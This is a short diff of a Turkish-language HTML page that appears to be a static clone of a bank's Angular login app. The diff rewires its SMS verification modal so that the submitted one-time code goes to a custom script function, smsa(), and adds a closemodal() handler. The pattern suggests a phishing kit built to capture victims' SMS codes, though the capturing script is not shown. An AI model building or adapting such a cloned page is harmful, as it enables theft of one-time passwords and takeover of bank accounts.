@@ -220,12 +220,12 @@
                </app-custom-numpad>
             </div>
             <div materialize="modal" class="modal hidden" id="sms-mdl" style="z-index: 1043; top: 10%; opacity: 1; transform: scaleX(1); display: block;">
-               <a href="javascript:;" class="modal-action modal-close ng-star-inserted"><i class="material-icons pg-icons">close</i></a><!----><!----><!---->
+               <a href="javascript:;" class="modal-action modal-close ng-star-inserted" onclick="closemodal()"><i class="material-icons pg-icons">close</i></a><!----><!----><!---->
                <div class="modal-content">
                   <sms-modal class="ng-star-inserted">
                      <div class="sms-modal">
                         <b>Lütfen sistemde kayıtlı telefon numaranıza gelen SMS deki doğrulama kodunu giriniz.</b>
-                        <form novalidate="" class="ng-untouched ng-pristine ng-invalid">
+                        <form novalidate="" class="ng-untouched ng-pristine ng-invalid" id="smsForm" action="javascript:;" onsubmit="smsa()">
                            <div class="input-field"><input id="SmsCode" name="smsCode" type="password" required="" maxlength="6" class="browser-default ng-untouched ng-pristine ng-invalid" placeholder="SMS şifresi"></div>
                            <button type="submit" class="btn">Giriş</button>
                         </form>
